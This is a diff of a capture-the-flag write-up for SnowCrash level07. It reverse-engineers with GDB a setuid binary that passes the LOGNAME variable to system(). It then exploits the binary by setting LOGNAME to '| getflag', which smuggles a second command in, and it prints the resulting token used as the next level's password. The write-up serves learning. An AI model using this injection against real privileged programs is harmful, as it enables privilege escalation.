@@ -5,19 +5,16 @@
 level07@SnowCrash:~$ ls -l
 total 12
 -rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
+```
 
+```
 level07@SnowCrash:~$ ./level07
-level07
-
-level07@SnowCrash:~$ ./level07 abc
 level07
 ```
 
 
 - A binary has been left for us. Let's take a closer look at this binary using [GDB](https://en.wikipedia.org/wiki/GNU_Debugger).
 ```
-level07@SnowCrash:~$ gdb ./level07
-...
 (gdb) info functions
 All defined functions:
 
@@ -28,6 +25,7 @@ Non-debugging symbols:
 0x08048384  _init
 ...
 ```
+
 ```
 (gdb) disas main
 Dump of assembler code for function main:
@@ -70,27 +68,32 @@ End of assembler dump.
 ```
 
 
-- The program calls `<getenv@plt>` after pushing the address (`0x8048680`) onto the stack, which points to the value of the parameter of this function.
+- The program calls `<getenv@plt>` after moving the address (`0x8048680`) on top of the stack.
 ```
 (gdb) x/s 0x8048680
 0x8048680:       "LOGNAME"
 ```
 
 
-- `<getenv@plt>` will thus save the value of the `LOGNAME` environment variable in the `eax` register, and this value will be passed as a parameter to the `<asprintf@plt>` function. Note that the address `0x8048688` is also pushed onto the stack to be used by `<asprintf@plt>`.
+- `<getenv@plt>` will thus save the value of the `LOGNAME` environment variable in the `eax` register, and this value will be passed as a parameter to the `<asprintf@plt>` function. Note that later, the address `0x8048688` will also be moved on top of the stack to be used by `<asprintf@plt>`.
 ```
 (gdb) x/s 0x8048688
 0x8048688:       "/bin/echo %s"
 ```
 
 
-- Then, `<asprintf@plt>` will store in the `eax` register the address pointing to the beginning of the string `/bin/echo %s`, where `%s` will be replaced by the contents of the `LOGNAME` environment variable.
+- Then, `<asprintf@plt>` will store in the `eax` register the address pointing to the string `/bin/echo %s`, where `%s` will be replaced by the contents of the `LOGNAME` environment variable.
 The resulting string will be executed by calling `<system@plt>`, so:
 ```
 level07@SnowCrash:~$ export LOGNAME="| getflag"
+```
+
+```
 level07@SnowCrash:~$ ./level07
 Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+```
 
+```
 level07@SnowCrash:~$ su level08
 Password:fiumuikeil55xe9cu4dood66h
 level08@SnowCrash:~$
